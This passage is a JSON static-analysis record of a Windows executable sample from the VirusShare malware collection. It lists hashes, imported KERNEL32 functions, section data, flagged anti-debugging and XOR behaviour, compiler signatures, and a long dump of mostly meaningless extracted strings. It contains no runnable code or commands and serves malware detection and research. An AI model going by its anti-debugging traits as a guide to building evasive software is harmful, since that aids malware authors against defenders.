{
    "docinfo": {},
    "filename": "VirusShare_c78336f25f14e4d90a960d7546683b3c",
    "filesize": 131584,
    "filetype": "PE32 executable (console) Intel 80386, for MS Windows",
    "hashes": {
        "md5": "c78336f25f14e4d90a960d7546683b3c",
        "sha1": "c783c7d821c8aa418da67f83ca67ec93c9885520",
        "sha256": "697e638530272e2d9a36448d60ce44ef54801a64f535061270bc0aef03d13e86"
    },
    "peinfo": {
        "behavior": [
            "DebuggerException__SetConsoleCtrl",
            "Check_OutputDebugStringA_iat",
            "anti_dbg",
            "Xor",
            "win_files_operation"
        ],
        "breakpoint": [
            "CloseHandle",
            "CreateFileA",
            "ExitProcess",
            "GetCommandLineA",
            "GetCurrentProcess",
            "GetModuleFileNameA",
            "GetModuleHandleA",
            "GetProcAddress",
            "GetStartupInfoA",
            "HeapAlloc",
            "IsBadReadPtr",
            "IsBadWritePtr",
            "LoadLibraryA",
            "OutputDebugStringA",
            "ReadFile",
            "SetFilePointer",
            "TerminateProcess",
            "UnhandledExceptionFilter",
            "WriteFile"
        ],
        "directories": {
            "debug": {
                "PointerToRawData": 131232,
                "size": 42
            },
            "export": [],
            "import": {
                "KERNEL32.dll": [
                    {
                        "function": "GetModuleHandleA",
                        "offset": 4534608
                    },
                    {
                        "function": "TerminateProcess",
                        "offset": 4534612
                    },
                    {
                        "function": "GetCurrentProcess",
                        "offset": 4534616
                    },
                    {
                        "function": "GetCommandLineA",
                        "offset": 4534620
                    },
                    {
                        "function": "GetVersion",
                        "offset": 4534624
                    },
                    {
                        "function": "IsBadWritePtr",
                        "offset": 4534628
                    },
                    {
                        "function": "IsBadReadPtr",
                        "offset": 4534632
                    },
                    {
                        "function": "HeapValidate",
                        "offset": 4534636
                    },
                    {
                        "function": "DebugBreak",
                        "offset": 4534640
                    },
                    {
                        "function": "GetStdHandle",
                        "offset": 4534644
                    },
                    {
                        "function": "InterlockedDecrement",
                        "offset": 4534648
                    },
                    {
                        "function": "OutputDebugStringA",
                        "offset": 4534652
                    },
                    {
                        "function": "WriteFile",
                        "offset": 4534656
                    },
                    {
                        "function": "GetProcAddress",
                        "offset": 4534660
                    },
                    {
                        "function": "LoadLibraryA",
                        "offset": 4534664
                    },
                    {
                        "function": "InterlockedIncrement",
                        "offset": 4534668
                    },
                    {
                        "function": "GetModuleFileNameA",
                        "offset": 4534672
                    },
                    {
                        "function": "GetStringTypeA",
                        "offset": 4534676
                    },
                    {
                        "function": "WideCharToMultiByte",
                        "offset": 4534680
                    },
                    {
                        "function": "GetStringTypeW",
                        "offset": 4534684
                    },
                    {
                        "function": "MultiByteToWideChar",
                        "offset": 4534688
                    },
                    {
                        "function": "GetLastError",
                        "offset": 4534692
                    },
                    {
                        "function": "CloseHandle",
                        "offset": 4534696
                    },
                    {
                        "function": "SetHandleCount",
                        "offset": 4534700
                    },
                    {
                        "function": "GetFileType",
                        "offset": 4534704
                    },
                    {
                        "function": "GetStartupInfoA",
                        "offset": 4534708
                    },
                    {
                        "function": "ReadFile",
                        "offset": 4534712
                    },
                    {
                        "function": "ExitProcess",
                        "offset": 4534716
                    },
                    {
                        "function": "RtlUnwind",
                        "offset": 4534720
                    },
                    {
                        "function": "UnhandledExceptionFilter",
                        "offset": 4534724
                    },
                    {
                        "function": "FreeEnvironmentStringsA",
                        "offset": 4534728
                    },
                    {
                        "function": "GetEnvironmentStrings",
                        "offset": 4534732
                    },
                    {
                        "function": "FreeEnvironmentStringsW",
                        "offset": 4534736
                    },
                    {
                        "function": "GetEnvironmentStringsW",
                        "offset": 4534740
                    },
                    {
                        "function": "GetCPInfo",
                        "offset": 4534744
                    },
                    {
                        "function": "GetACP",
                        "offset": 4534748
                    },
                    {
                        "function": "GetOEMCP",
                        "offset": 4534752
                    },
                    {
                        "function": "HeapCreate",
                        "offset": 4534756
                    },
                    {
                        "function": "HeapDestroy",
                        "offset": 4534760
                    },
                    {
                        "function": "HeapAlloc",
                        "offset": 4534764
                    },
                    {
                        "function": "HeapReAlloc",
                        "offset": 4534768
                    },
                    {
                        "function": "HeapFree",
                        "offset": 4534772
                    },
                    {
                        "function": "HeapUnlock",
                        "offset": 4534776
                    },
                    {
                        "function": "HeapWalk",
                        "offset": 4534780
                    },
                    {
                        "function": "HeapLock",
                        "offset": 4534784
                    },
                    {
                        "function": "SetConsoleCtrlHandler",
                        "offset": 4534788
                    },
                    {
                        "function": "SetStdHandle",
                        "offset": 4534792
                    },
                    {
                        "function": "FlushFileBuffers",
                        "offset": 4534796
                    },
                    {
                        "function": "SetFilePointer",
                        "offset": 4534800
                    },
                    {
                        "function": "CreateFileA",
                        "offset": 4534804
                    },
                    {
                        "function": "LCMapStringA",
                        "offset": 4534808
                    },
                    {
                        "function": "LCMapStringW",
                        "offset": 4534812
                    },
                    {
                        "function": "SetEndOfFile",
                        "offset": 4534816
                    }
                ]
            },
            "relocations": {
                "Size": 4060,
                "VirtualAddress": 344064,
                "count": 22,
                "details": {
                    "reloc_1": 98,
                    "reloc_10": 116,
                    "reloc_11": 76,
                    "reloc_12": 96,
                    "reloc_13": 100,
                    "reloc_14": 92,
                    "reloc_15": 132,
                    "reloc_16": 96,
                    "reloc_17": 38,
                    "reloc_18": 70,
                    "reloc_19": 62,
                    "reloc_2": 236,
                    "reloc_20": 6,
                    "reloc_21": 4,
                    "reloc_22": 42,
                    "reloc_3": 188,
                    "reloc_4": 114,
                    "reloc_5": 6,
                    "reloc_6": 94,
                    "reloc_7": 110,
                    "reloc_8": 86,
                    "reloc_9": 80
                }
            },
            "resources": [],
            "sign": {},
            "tls": {
                "AddressOfCallBacks": 65535,
                "AddressOfIndex": 4,
                "Characteristics": 0,
                "EndAddressOfRawData": 3,
                "SizeOfZeroFill": 184,
                "StartAddressOfRawData": 9460301
            }
        },
        "dll": false,
        "entrypoint": 28336,
        "features": {
            "antidbg": [
                "GetLastError",
                "OutputDebugStringA",
                "TerminateProcess",
                "UnhandledExceptionFilter"
            ],
            "antivm": {},
            "crypto": [],
            "mutex": [],
            "packer": [
                "Microsoft_Visual_Cpp_v50v60_MFC_additional",
                "Microsoft_Visual_Cpp_50",
                "Microsoft_Visual_Cpp_v50v60_MFC",
                "Microsoft_Visual_Cpp"
            ],
            "xor": {}
        },
        "imagebase": 4194304,
        "imphash": "105e3120c074b4623b05755166e951e6",
        "metadata": {},
        "sections": {
            "count": 5,
            "details": [
                {
                    "characteristics": 1610612768,
                    "data": "b'\\xe9r\\x05\\x00\\x00\\xe9\\x80\\x06\\x00\\x00\\xe9\\xe3\\x0",
                    "entropy": 5.204176269693758,
                    "executable": true,
                    "hash": {
                        "md5": "64f2c1d1db14a374af031a15f8e8c3e6",
                        "sha1": "e4e0609d48ff62849011d9bcf2d681b8852c41ba",
                        "sha256": "c0f18feeb16023f3af287ccc7e5cfa50a1b136754921a96c27f5a0200af71b45"
                    },
                    "section_name": ".text",
                    "size_of_raw_data": 93184,
                    "virtual_address": 4096,
                    "virtual_size": 92852
                },
                {
                    "characteristics": 1073741888,
                    "data": "b'\\x00\\x00\\x00\\x00\\xa3T\\xee3\\x00\\x00\\x00\\x00\\x04\\x",
                    "entropy": 4.4386155998938746,
                    "executable": false,
                    "hash": {
                        "md5": "4f7f40259802d38a543b41c1cea903d0",
                        "sha1": "be4de9571aae429c237a8bf40bc8f958882b3f3f",
                        "sha256": "dcf97ff1917f838fdcb1a6fa92173fd01214204f5669bc95c0d4aaa60512323e"
                    },
                    "section_name": ".rdata",
                    "size_of_raw_data": 5632,
                    "virtual_address": 98304,
                    "virtual_size": 5174
                },
                {
                    "characteristics": 3221225536,
                    "data": "b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
                    "entropy": 3.778015128541379,
                    "executable": false,
                    "hash": {
                        "md5": "a517f658ac2fcbf19518564d29ab3209",
                        "sha1": "0ad958e538e874c7817e6a19609813d2f222cfc0",
                        "sha256": "43ab38c74219ce7d67883afd439395148a4b7b0e5e8b2a9cf20e1a30e6831ffb"
                    },
                    "section_name": ".data",
                    "size_of_raw_data": 22016,
                    "virtual_address": 106496,
                    "virtual_size": 229460
                },
                {
                    "characteristics": 3221225536,
                    "data": "b'(0\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\n6\\x0",
                    "entropy": 4.118145818968862,
                    "executable": false,
                    "hash": {
                        "md5": "dfc240165ac8e9db2b9c1aeba8f1dd31",
                        "sha1": "2e2fd1d8e6cbc3b3a22074bbb5f2b42e2abf519d",
                        "sha256": "8ceea34edc12e96576319b8a24833ebadd241ad8345cdd2c8aa5253e58426b39"
                    },
                    "section_name": ".idata",
                    "size_of_raw_data": 2048,
                    "virtual_address": 339968,
                    "virtual_size": 1908
                },
                {
                    "characteristics": 1107296320,
                    "data": "b'\\x00\\x10\\x00\\x00\\xcc\\x00\\x00\\x0071D1Q1i1n1{1\\x88",
                    "entropy": 5.59714967563684,
                    "executable": false,
                    "hash": {
                        "md5": "8e372d7994bb28ffe9421c2679b91ac2",
                        "sha1": "3fc0d4321a6772a97f618837ebce8ba526f77c37",
                        "sha256": "0a4ea9ce0fdad615882d1e5908ff1a4d24180919de1b84811a012a7224ae5092"
                    },
                    "section_name": ".reloc",
                    "size_of_raw_data": 5632,
                    "virtual_address": 344064,
                    "virtual_size": 5270
                }
            ]
        },
        "timestamp": "1997-08-10 23:56:24"
    },
    "strings": {
        "dump": [
            "L!This program cannot be run in DOS mode.",
            ".text",
            "`.rdata",
            "@.data",
            ".idata",
            ".reloc",
            "USVWhLA",
            "h@rB",
            "h@rB",
            "h@rB",
            "`h8rB",
            "PhRB",
            "h@rB",
            "h@rB",
            "h@rB",
            "h@rB",
            "_^[U",
            "SVWE",
            "PEPhA",
            "_^[USVW",
            "_^[USVW",
            "_^[U",
            "SVWME",
            "EEM9@",
            "SVWME",
            "Eh\u062bA",
            "EP=O",
            "EP@sB",
            "EEEM@",
            "USVW",
            "_^[USVW",
            "_^[U",
            "SVWME",
            "SVWME",
            "EEM9",
            "SVWME",
            "Eh<A",
            "E PL",
            "E@PL",
            "E`PL",
            "EP(L",
            "EP@sB",
            "SVWE",
            "P@sB",
            "P@sB",
            "_^[U",
            "SVWE",
            "_^[USVW}",
            "_^[U",
            "SVWE",
            "_^[U",
            "SVWE",
            "Ph\u042dA",
            "EPlH",
            "EEEn",
            "EP%H",
            "EE\u0180C",
            "_^[U",
            "SVWh",
            "Ph$A",
            "EP#J",
            "EPhA",
            "EPqI",
            "EP[I",
            "EP?E",
            "_^[U",
            "SVWhA",
            "Ph\u052eA",
            "EP{H",
            "EPjH",
            "EPYH",
            "EPHH",
            "EP7H",
            "EP&H",
            "PhpA",
            "EPqG",
            "EP`G",
            "EPOG",
            "EP>G",
            "EP-G",
            "EPrF",
            "EPaF",
            "EPPF",
            "EP?F",
            "EP.F",
            "EPyE",
            "EPhE",
            "EPWE",
            "EPFE",
            "EP5E",
            "EP$E",
            "EPzD",
            "EPiD",
            "EPXD",
            "EPAD",
            "EP0D",
            "EPuC",
            "EPdC",
            "EPSC",
            "EPBC",
            "EP1C",
            "EP C",
            "EPvB",
            "EPeB",
            "EPTB",
            "EPCB",
            "EP2B",
            "EP!B",
            "EPwA",
            "EPfA",
            "EPUA",
            "EPDA",
            "EP3A",
            "EP\"A",
            "EPx@",
            "EPg@",
            "EPV@",
            "EP@@",
            "EP/@",
            "EPj?",
            "EPY?",
            "EPC?",
            "EP2?",
            "EP!?",
            "EPr>",
            "EPa>",
            "EPP>",
            "EP?>",
            "EP)>",
            "EPn=",
            "EP]=",
            "EPL=",
            "EP;=",
            "EP*=",
            "EP{<",
            "EPj<",
            "EPT<",
            "EPC<",
            "EP-<",
            "EP~;",
            "EPm;",
            "EP\\;",
            "EPK;",
            "EP:;",
            "EP);",
            "EPu:",
            "EPd:",
            "EPS:",
            "EPB:",
            "EP,:",
            "EP}9",
            "EPg9",
            "EPV9",
            "EPE9",
            "EP49",
            "EP#9",
            "EPo8",
            "EP^8",
            "EPM8",
            "EP<8",
            "EP+8",
            "EP\t8",
            "EP|7",
            "EPf7",
            "EPU7",
            "EPD7",
            "EP37",
            "EP\"7",
            "EPs6",
            "EPb6",
            "EPL6",
            "EP;6",
            "EP*6",
            "EP{5",
            "EPe5",
            "EPT5",
            "EPC5",
            "EP25",
            "EP!5",
            "EP~4",
            "EPm4",
            "EP\\4",
            "EPK4",
            "EP:4",
            "EP)4",
            "EPu3",
            "EPd3",
            "EPS3",
            "EPB3",
            "EP13",
            "EP 3",
            "EP}2",
            "EPl2",
            "EPV2",
            "EPE2",
            "EP42",
            "EP#2",
            "EPj1",
            "EPY1",
            "EPH1",
            "EP71",
            "EP&1",
            "EP|0",
            "EPk0",
            "EPU0",
            "EPD0",
            "EP.0",
            "EPs/",
            "EPb/",
            "EPQ/",
            "EP@/",
            "EP//",
            "E@3+",
            "EPo.",
            "EPY.",
            "EP=*",
            "_^[U8SVWE",
            "E\u070bED",
            "E\u070bED",
            "E\u070bED",
            "_^[U",
            "SVWE",
            "_^[USVWE",
            "_^[U",
            "SVWE",
            "_^[U",
            "SVWE",
            "_^[USVWHA",
            "_^[USVWHA",
            "_^[USVWHA",
            "_^[USVWHA",
            "_^[U",
            "SVWE",
            "_^[U",
            "SVWhA",
            "_^[U",
            "SVWE",
            "_^[U",
            "SVWE",
            "_^[U",
            "SVWE",
            "_^[U SVWE",
            "EEMU",
            "EE9E",
            "EPEPEPE",
            "E+E=",
            "E3E3+%",
            "EE+E3\u024a\u020b3+%",
            "EE+E3\u024a\u020bEU",
            "EEEM",
            "EEEEEEEu",
            "$hLA",
            "_^[USVW=",
            "_^[USVWj",
            "_^[USVWj",
            "_^[USVWj",
            "_^[USVWj",
            "_^[U",
            "SVW=A",
            "=P E",
            "_^[USVWE",
            "_^[U",
            "SVWE",
            "j6hTA",
            "EEPE",
            " P;2",
            " PEP/",
            "_^[U",
            "SVWE",
            "EPEPEPj",
            "_^[\u030bL$",
            "tOL$",
            "u^[_3",
            "F8u~a",
            "8u\u010aA",
            "8t3^[_L",
            "G^[_",
            "^[_W|$",
            "j...L$",
            "tAt#t",
            "tt4t'",
            "SVWE",
            "j-hpA",
            "_^[U",
            "SVWEE",
            "jwhA",
            "EPgM",
            "EEPHL",
            "_^[U",
            "SVW}",
            "jihA",
            "EPcV",
            "_^[U",
            "SVW}",
            "j5hA",
            "j6hA",
            "j7hA",
            "j8hA",
            "_^[USVWj@E",
            "_^[U",
            "SVWE",
            "j8hA",
            "j9hA",
            "EEP&",
            "EEPE",
            "PEPs*",
            "EEPEP",
            "_^[USVWj",
            "_^[U SVWE",
            "EE=A",
            "EE+u",
            "3EPf",
            "E0Ei",
            "EEME",
            "E\u0609EE",
            "_^[USVWj",
            "_^[+",
            "SVWe",
            "=0 E",
            "EEPx",
            "EEPEPr\\",
            "eEP]",
            "_^[USVW=(A",
            "_^[USVWj",
            "_^[USVWE",
            "_^[USVWj",
            "_^[U",
            "SVWE",
            "_^[USVWj",
            "_^[U",
            "SVWE",
            "PEPE",
            "PhlA",
            "$EEP<q",
            "P3DA",
            "PE Pn",
            "_^[USVWj",
            "_^[U",
            "SVWE",
            "EEE9E",
            "_^[USVWj",
            "_^[U",
            "SVWj",
            "_^[U",
            "SVWE",
            "PEPE",
            "PhxA",
            "Ph$A",
            " EEx",
            "$PEPel",
            "$PEPk",
            "3M+A",
            "3M+A",
            "E EEM",
            "P3DA",
            "\u030bE9E",
            "_^[USVWj",
            "_^[U",
            "SVWj",
            "_^[USVWj",
            "_^[U",
            " EE@",
            "E PE@",
            "PhlA",
            "E PE@",
            "Ph@A",
            "$P3@A",
            "EPkg",
            "3M+A",
            "$P3@A",
            "PEPc",
            "P3@A",
            "PE Pvc",
            "_^[USVWj",
            "_^[U",
            " EE@",
            "_^[U",
            "SVW8A",
            "_^[U",
            "SVWE",
            " EE@",
            "_^[U",
            "SVWA",
            "_^[U",
            "SVWE",
            "3\u024aHQE",
            "HPh\u0704A",
            "_^[U",
            "SVWE",
            "E$h@",
            "E PE@",
            "PEPhlA",
            "E PE@",
            "PEPh@A",
            "PE P",
            "E PhdA",
            "PEPhDA",
            "PE PEPh",
            "_^[U",
            "SVW0A",
            "_^[U",
            "PE PU",
            "_^[USVW}",
            "_^[USVW}",
            "_^[U",
            "SVWE",
            " EE@",
            "_^[U",
            "SVW$ E",
            "_^[U",
            "SVW}",
            "EPhTA",
            "A0_^[U",
            "SVWE",
            "+A,M",
            "+A0M",
            "_^[U",
            "SVWE",
            "PhxA",
            "PhpA",
            "PE Ph<A",
            "\u0303=$ E",
            "PE P",
            "PE Ph",
            "PE PhA",
            "\u030bEP1",
            "_^[UTSVWE",
            " E=A",
            " 3EPhA",
            "EPEPhA",
            "_^[U4SVWEP",
            "_^[U",
            "SVW}",
            "Ph A",
            "@,PhA",
            "@0Ph\u0707A",
            "_^[U",
            "SVW}",
            "jAh@A",
            "E<`A",
            "j^h@A",
            "E<`A",
            "_^[U",
            "SVW}",
            "EPr ",
            "_^[U",
            "SVW=  E",
            "=  E",
            "_^[USVW",
            "_^[U",
            "SVW\u01c5",
            "EE\u8245X",
            "E\u0609T5",
            "T3\u024a@",
            "DH\u04090",
            "E\u0609Pc",
            "PIP.",
            "fEEPPQ",
            "EEPR",
            "E\u0709Eb",
            "EEhh",
            "E\u0603 E\u0603M@E",
            "EPEPP",
            "EEPO",
            "\u01850QE",
            "E\u05c9Edd",
            "RPSQL",
            "0RPSQ L",
            "MNE+EEEE",
            "LCL5",
            "L3\u024a\u029f@",
            "+E+E|E",
            "P|Pj \"",
            "PEPPT",
            "P|Pj0",
            "ExE\u0709tt`t`",
            "PpPH",
            "PlPpPz",
            "PEPEPU",
            "P|Pj ",
            "_^[U",
            "SVWE",
            "_^[U",
            "SVWE",
            "_^[U",
            "SVWE",
            "_^[USVWE",
            "_^[USVWE",
            "_^[USVWE",
            "_^[USVW",
            "_^[U",
            "SVW}",
            "_^[U",
            "SVW}",
            "_^[U",
            "_^[U(",
            "SVW\u0185",
            "Ph$A",
            "_^[U$",
            "SVW}",
            "EEP/B",
            "RPPlA",
            "SPdA",
            "RP\\A",
            "RPPA",
            "REPE",
            "_^[U",
            "SVW=0A",
            "jvh8A",
            "EPEPE",
            "UfDJEPEPEPE",
            "M3fTA",
            "PEPE",
            "_^[U",
            "SVW=4A",
            "Pj\tE",
            "EPEPE",
            "PEPEPE",
            "_^[\u030dB[...3D$",
            "B8t\u0444tQ",
            "u^_[3",
            "B8t6t8t't",
            "t^_B[",
            "B^_[",
            "B^_[",
            "B^_[U",
            "SVWE",
            "_^[USVW}",
            "j0hLA",
            "_^[USVW}",
            "_^[U",
            "SVWE",
            "EPE@",
            " EE@",
            "_^[USVWj",
            "_^[U",
            "SVWE",
            "_^[UhSVWh",
            "EEE=",
            "\u0209EE8",
            "_^[U",
            "SVWE",
            "_^[U SVWE",
            "PEPE",
            "EPZ@",
            "EEEE",
            "EE+E",
            "_^[U",
            "SVW}",
            "j.htA",
            "Ej;htA",
            "_^[U$SVWA",
            "jGhA",
            "jHhA",
            "jIhA",
            "m+}I",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t",
            "PEPE",
            "EEMA",
            "_^[U",
            "SVWE",
            "E  E",
            "jUhA",
            "_^[USVWE",
            "_^[U",
            "SVW=",
            "EPEPEPh",
            "_^[USVWh",
            "_^[\u0303",
            "GAD$",
            "PAD$",
            "SVWUt",
            "]_^[",
            "3]_^[",
            "S\u05c9D$",
            "3]_^[",
            "3]_^[",
            "PQUT$ u",
            "3]_^[",
            "3]_^[",
            "3]_^[",
            "3]_^[",
            "PP\u0585u%D$",
            "PQUT$ u",
            "PP\u058bD$ ]_^[",
            "VWt$",
            "F9=A",
            "Fu_^\u030bT$",
            "uJ:0u",
            "J:0t",
            "3\u030bD$",
            "Pt\"L$",
            "\u0300=`A",
            "SVWUt3=<",
            "QR@U",
            "-l$ ",
            "\u0343?-u",
            "\u0203|$ ",
            "80t@_",
            "-Ad|",
            "]_^[\u0300=`A",
            "SVWUt35<",
            "9-dA",
            "}2=`A",
            "0000",
            "]_^[SVWUl$",
            "PQ;S",
            "-Q|$ ",
            "0S%R",
            "|$;~ t",
            "WVUM",
            "]_^[",
            "D$ PWVU",
            "]_^[",
            "et?Et:fu",
            "QRPO",
            "VWt$",
            "_^USVWUj",
            "]_^[]",
            "SVWD$",
            "Pjh|@",
            "D$ X",
            "t.;t$$t(4v",
            "_^[3d",
            "SQlA",
            "SQlA",
            "SVWE",
            "_^[U",
            "SVWEA",
            "_^[U",
            "SVWE",
            "EjUh8A",
            "jah8A",
            "_^[U",
            "SVWh",
            "EEPEPj",
            "jyhDA",
            "EPEPE",
            "EPEPEP",
            "_^[U",
            "SVWE",
            "EE3E3\u024a",
            "E3E ",
            "EEM}",
            "_^[U",
            "SVWE",
            "EEE3f",
            "EjWhPA",
            "EPEPEPH",
            "jEPj",
            "EEEEE",
            "EM+M",
            "+PEPjEPj",
            "EEP G",
            "EyEf",
            "_^[U",
            "SVW=",
            "EEE3f",
            "EPEPj",
            "EPEPEPEPj",
            "EE+E@Eh&",
            "EPEPEP",
            "_^[U(SVWE",
            "9@@A",
            "E3\u024aH",
            "E\u070bE3\u024aH",
            "IfADA",
            "E3\u024aH",
            "E\u070bE3\u024aH",
            "_^[USVW",
            "_^[U",
            "SVWE",
            "E3\u024a@",
            "_^[U",
            "SVWE",
            "_^[USVW",
            "_^[USVWj",
            "_^[USVWj",
            "_^[USVWx",
            "_^[VC20XC00U",
            "SVWU]",
            "EECs",
            "tEVUk",
            "t3x<{",
            "]_^[]UL$",
            "USVW=(A",
            "_^[U",
            "SVWE",
            "\u0303=(A",
            "EEP<",
            "EPPP",
            "PPP\u8541",
            "_^[U",
            "SVWE",
            "_^[U",
            "SVWD",
            "_^[USVWD",
            "_^[USVW=D",
            "_^[\u030bT$",
            "tG3D$",
            "GJuD$",
            "USVWA",
            "_^[U",
            "SVW}",
            "_^[USVWE",
            "_^[USVW",
            "_^[USVW}",
            "_^[U",
            "SVW}",
            "_^[USVW}",
            "_^[USVWj",
            "_^[Ujh",
            " SVWeEj",
            "3fE\u04a8",
            "3fE\u04a8",
            "_^[U,SVWEE\u070dE",
            "j]h A",
            "j^h A",
            "PEP\u8eab",
            "E\u060bEH",
            "_^[USVW",
            "_^[U",
            "SVWE",
            "E  E",
            "_^[U",
            "SVW}",
            "_^[SVD$",
            "3\u060bD$",
            "A\u020b\\$",
            "N3\u048b^[",
            "3P\u020b\\$",
            "tAt2t$",
            "\u034dAL$",
            "SVW}",
            "jihlA",
            "EEEE@",
            "EPE@",
            "EE9E",
            "_^[USVW}",
            "_^[U",
            "SVWE",
            "MEE9E",
            "_^[U",
            "SVW}",
            "_^[USVWj",
            "_^[U,SVWEE\u070dE",
            "j]h A",
            "j^h A",
            "PEP+",
            "E\u060bEH",
            "_^[U(SVWEE\u0703}",
            "jZhxA",
            "j[hxA",
            "PEPA",
            "E\u060bEH",
            "_^[U",
            "SVW}",
            "E3\u024a@",
            "_^[U",
            "SVW}",
            "SVWE",
            "E3\u024a@",
            "_^[U",
            "SVWEA",
            "_^[U",
            "SVWE",
            "_^[\u030bL$",
            "WtzVS\u064bt$",
            "GIt%t)",
            "Gt/KuD$",
            "GKu[^D$",
            "t\u0784t,t",
            "[^_UWVu",
            "SVWE",
            "_^[U",
            "SVWEE",
            "jyhA",
            "_^[U",
            "_^[U",
            "_^[USVWE",
            "_^[U",
            "SVWE",
            "_^[U",
            "SVWE",
            "_^[U ",
            "SVWE",
            "EE+=",
            "PE+PPE",
            "EE+;",
            "_^[U",
            "SVWE",
            "_^[U",
            "SVWE",
            "E@EE",
            "EPj@E",
            "_^[UHSVWE",
            "E3\u024aA",
            "3RE\u0600",
            "E\u050b@EE",
            "EPEPEPEPEPE",
            "E\u020bEPEP",
            "E\u020aE\u020bM",
            "EPEPC",
            "EPEP",
            "_^[U",
            "SVW=A",
            "EPEPE",
            "EPEPE",
            "EP[c",
            "EPEPEPEPE",
            "PEPE",
            "EPEPj",
            "PEPEPj",
            "_^[U",
            "SVWE",
            "EEEM}",
            "_^[U",
            "SVW=A",
            "Pj\tE P",
            "EPEPE",
            "EPEPE",
            "PEPEPE",
            "EPEPEPEPE",
            "EPEPh ",
            "PEPEPh ",
            "EP:j",
            "EP,j",
            "_^[U",
            "SVWE",
            "EEEM}",
            "_^[\u0303",
            "^fT$",
            "f3T$",
            "USVWj",
            "_^[USVWE",
            "_^[U",
            "SVW=",
            "EPEPEPh",
            "_^[SVt$",
            "3+*\u020bD$",
            "3_^[G",
            "_^[3_^[SVW|$",
            "3+*\u020d",
            "Ny_^[\u0303",
            "SVWUl$ }",
            "\u01d93+#3++\u060bD$",
            "t%GD$",
            "+\u038d<3D$",
            "]_^[",
            "Ju^\u030bL$",
            "3\u030bL$",
            "\u020bt$$\u07b1 *\u023d",
            "M{u\u0639",
            "Iy]_^[",
            "SV3fWU",
            "u93\u06cdD$",
            "3|$4",
            "P|$8",
            "PQk|$<D$",
            "N+D$",
            "UQVT$",
            "QREL$",
            "3@PQ1",
            "T$0L$",
            "]_^Z",
            "]_^[",
            "SVW3fy",
            "L$ T$",
            "L$0T$ ",
            "L$0T$ ",
            "L$0T$ ",
            "SVWE",
            "_^[\u030dD$",
            "VfWf",
            "<)3u",
            "_^[f",
            "u%fN",
            "_^[U",
            "SVWE",
            "EEEE",
            "_^[UWVu",
            "^_U ",
            "SVW\u01c5",
            "j~h\u030fA",
            "8EPE",
            "_^[V3T$",
            "1^VWt$",
            "_^\u030bT$",
            "VWt$",
            "SVt$ WfN@U\\$$",
            "tml$ L$",
            "KEV,L$",
            "tF\tu",
            "F\ttf~",
            "]_^[",
            "\u0303TSVD$ ",
            "WUl$<3f|$",
            "|$ |$0|$,|$43\u024bt$p|$8|$",
            "|$$t$",
            "3PM<",
            "t!|$",
            "0EFD$",
            "3P+A",
            "$<+A",
            "0t=A",
            "0ED$",
            "F1D$",
            "F0t1",
            "\u02cd|A\u0401P",
            "t5FD$",
            "D$l|$ ",
            "D$SMD$",
            "tD$XL$",
            "T$<PQR",
            "|$x|$0",
            "+|$|P",
            "3D$tL$XPWQ\t",
            "ft$dL$ff|$nT$j",
            "f33f33",
            "ft$<L$<f|$<T$<|$ ",
            "f33f33D$$",
            "8|$4",
            "f33D$$",
            "f33f33D$$",
            "D$hf0H",
            "D$$]_^[T",
            "PQD$",
            "RPL$0",
            "UD$$D$%D$&D$'D$(D$)D$*D$+?fD$D|$PD$",
            "fL$Df",
            " fu0|$@",
            "u)|$<",
            "]_^[(f",
            "t5D$C@u.A",
            "ft:|$@",
            "u0|$<",
            "u0|$<",
            "\u040d4r\u018d",
            "fFD$ L$",
            "f7t/",
            "\u018bt$H",
            "]_^[(",
            "F\u0745~cT$",
            "L$,C",
            "Q\tL$",
            "QL$0T$",
            "QRzL$",
            "0NCD$",
            "uCKK<5|7;r",
            "0K;s;s",
            "]_^[(;r",
            "K;s;sf",
            "_^[(U",
            "_^[Q=",
            "s+\u020b\u0105",
            "SVt$(WfN",
            "U3T$4fR",
            "f3|$",
            "f=?w",
            ">_^[",
            "fu'fD$",
            "]_^[",
            "3fu+fD$",
            "T$4B",
            "3D$$D$ |$ ",
            "+D$ D$(~BD$$l",
            "3\u024bT$4f",
            "t\tD$$fD",
            "L$(u\u0183D$$",
            "D$ |$ ",
            "|fl$",
            "?f|$",
            "PjfL$",
            "EfL$",
            "y1f|$",
            "f9D$",
            "v>|$",
            "u33\u0249L$",
            "u L$",
            "]_^[",
            "SVWA",
            "|$ ta}",
            "u_^[",
            "%T1E",
            "%X1E",
            "%\\1E",
            "%`1E",
            "%d1E",
            "%h1E",
            "%l1E",
            "%p1E",
            "%t1E",
            "%x1E",
            "%|1E",
            "%P1E",
            "% 2E",
            "printf.c",
            "format != NULL",
            "gets.c",
            "string != NULL",
            "fclose.c",
            "str != NULL",
            "_filbuf.c",
            "*mode != _T('\\0')",
            "mode != NULL",
            "*file != _T('\\0')",
            "fopen.c",
            "file != NULL",
            "fprintf.c",
            "Client",
            "Ignore",
            "Normal",
            "Free",
            "Error: memory allocation: bad memory block type.",
            "Invalid allocation size: %u bytes.",
            "Client hook allocation failure.",
            "Client hook allocation failure at file %hs line %d.",
            "dbgheap.c",
            "_CrtCheckMemory()",
            "_pFirstBlock == pOldBlock",
            "_pLastBlock == pOldBlock",
            "fRealloc || (!fRealloc && pNewBlock == pOldBlock)",
            "_BLOCK_TYPE(pOldBlock->nBlockUse)==_BLOCK_TYPE(nBlockUse)",
            "pOldBlock->nLine == IGNORE_LINE && pOldBlock->lRequest == IGNORE_REQ",
            "_CrtIsValidHeapPointer(pUserData)",
            "Allocation too large or negative: %u bytes.",
            "Client hook re-allocation failure.",
            "Client hook re-allocation failure at file %hs line %d.",
            "_pFirstBlock == pHead",
            "_pLastBlock == pHead",
            "pHead->nBlockUse == nBlockUse",
            "pHead->nLine == IGNORE_LINE && pHead->lRequest == IGNORE_REQ",
            "DAMAGE: after %hs block (#%d) at 0x%08X.",
            "DAMAGE: before %hs block (#%d) at 0x%08X.",
            "_BLOCK_TYPE_IS_VALID(pHead->nBlockUse)",
            "Client hook free failure.",
            "memory check error at 0x%08X = 0x%02X, should be 0x%02X.",
            "%hs located at 0x%08X is %u bytes long.",
            "%hs allocated at file %hs(%d).",
            "DAMAGE: on top of Free block at 0x%08X.",
            "DAMAGED",
            "_heapchk fails with unknown return value!",
